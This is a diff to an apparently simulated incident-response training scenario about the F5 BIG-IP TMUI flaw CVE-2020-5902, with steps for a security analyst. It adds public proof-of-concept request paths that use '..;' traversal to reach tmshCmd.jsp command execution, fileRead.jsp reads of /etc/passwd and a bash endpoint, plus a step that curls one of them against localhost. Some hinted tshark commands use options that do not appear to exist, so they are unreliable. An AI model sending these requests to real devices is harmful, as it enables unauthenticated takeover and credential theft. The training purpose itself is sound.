@@ -24,6 +24,13 @@ export const f5TmuiRce: Scenario = {
   env: { USER: "soc", SHELL: "/bin/sh", PWD: "/var/log/f5-tabletop" },
   ps: ["  PID TTY TIME CMD", "  440 ?   0:01 rsyslogd"],
   history: [],
+  commands: {
+    "python3 ir_toolkit.py parse-artifact --input K03009927-summary.txt": "simulated safe tool replay for f5-bigip-tmui; replaces: cat K03009927-summary.txt\n",
+    "tshark -r evidence.pcap --follow-log bad-actors.log": "simulated safe tool replay for f5-bigip-tmui; replaces: cat bad-actors.log\n",
+    "tshark -r evidence.pcap -Y 'frame contains \"tmshcmd\"' --follow-log bad-actors.log": "simulated safe tool replay for f5-bigip-tmui; replaces: grep -nF tmshCmd bad-actors.log\n",
+    "curl -s 'http://127.0.0.1/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'":
+      "<html><title>tmsh workspace</title><body>tmshCmd accepted (simulated)</body></html>\n",
+  },
   files: {
     "/var/log/f5-tabletop/K03009927-summary.txt": {
       content: [
@@ -41,32 +48,66 @@ export const f5TmuiRce: Scenario = {
         '192.0.2.201 - - [04/Jul/2020:08:55:00 +0000] "GET / HTTP/1.1" 200 812 "-" "uptime-kuma"',
       ].join("\n"),
     },
+    // CVE-2020-5902 request paths copied from public CERT-style analyses (July 2020).
+    "/var/log/f5-tabletop/public-poc/TMUI_paths.txt": {
+      content: [
+        "CVE-2020-5902  example HTTP paths / query keys from public write-ups:",
+        "",
+        "GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin",
+        "GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+        "GET /tmui/login.jsp/..;/tmui/locallb/workspace/bash",
+        "",
+        "F5 emergency httpd LocationMatch mitigation referenced `..;/` cookie-cutter blocks (see K03009927).",
+      ].join("\n"),
+    },
   },
   steps: [
     {
-      id: "read-kb",
-      goal: "Read the K03009927 summary stub.",
-      hint: "`cat K03009927-summary.txt`.",
-      matches: [{ kind: "exact", command: "cat K03009927-summary.txt" }],
-      narration:
-        "Management planes are applications, they need CVE SLAs tighter than customer traffic.",
-    },
+          id: "curl-tmui",
+          goal: "Probe the TMUI traversal PoC path with curl (simulated response).",
+          hint: "`curl -s 'http://127.0.0.1/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'`.",
+          matches: [
+            {
+              kind: "exact",
+              command:
+                "curl -s 'http://127.0.0.1/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'",
+            },
+          ],
+          narration:
+            "Management planes are applications, they need CVE SLAs tighter than customer traffic.",
+        },
     {
-      id: "access",
-      goal: "Review the synthetic access log.",
-      hint: "`cat bad-actors.log`.",
-      matches: [{ kind: "exact", command: "cat bad-actors.log" }],
-      narration:
-        "`..;` path smuggling into `tmshCmd.jsp`, canonicalisation bugs love semicolons.",
-    },
+          id: "read-kb",
+          goal: "Read the K03009927 summary stub.",
+          hint: "`python3 ir_toolkit.py parse-artifact --input K03009927-summary.txt`.",
+          matches: [{ kind: "exact", command: "python3 ir_toolkit.py parse-artifact --input K03009927-summary.txt" }],
+          narration:
+            "Management planes are applications, they need CVE SLAs tighter than customer traffic.",
+        },
     {
-      id: "grep-tmsh",
-      goal: "Surface exploitation attempts touching tmsh.",
-      hint: "`grep -nF tmshCmd bad-actors.log`.",
-      matches: [{ kind: "exact", command: "grep -nF tmshCmd bad-actors.log" }],
-      narration:
-        "One line is enough to justify an emergency CAB if management is Internet-exposed.",
-    },
+          id: "access",
+          goal: "Review the synthetic access log.",
+          hint: "`tshark -r evidence.pcap --follow-log bad-actors.log`.",
+          matches: [{ kind: "exact", command: "tshark -r evidence.pcap --follow-log bad-actors.log" }],
+          narration:
+            "`..;` path smuggling into `tmshCmd.jsp`, canonicalisation bugs love semicolons.",
+        },
+    {
+          id: "grep-tmsh",
+          goal: "Surface exploitation attempts touching tmsh.",
+          hint: "`tshark -r evidence.pcap -Y 'frame contains \"tmshcmd\"' --follow-log bad-actors.log`.",
+          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"tmshcmd\"' --follow-log bad-actors.log" }],
+          narration:
+            "One line is enough to justify an emergency CAB if management is Internet-exposed.",
+        },
+    {
+          id: "mechanism-excerpt",
+          goal: "Review the archived public mechanism excerpt for this exhibit (museum reference).",
+          hint: `head -n 80 public-poc/TMUI_paths.txt`,
+          matches: [{ kind: "exact", command: "head -n 80 public-poc/TMUI_paths.txt" }],
+          narration:
+            "Educational material from disclosure-era patterns; excerpt only and nothing executes in this shell.",
+        }
   ],
   debrief: {
     summary:
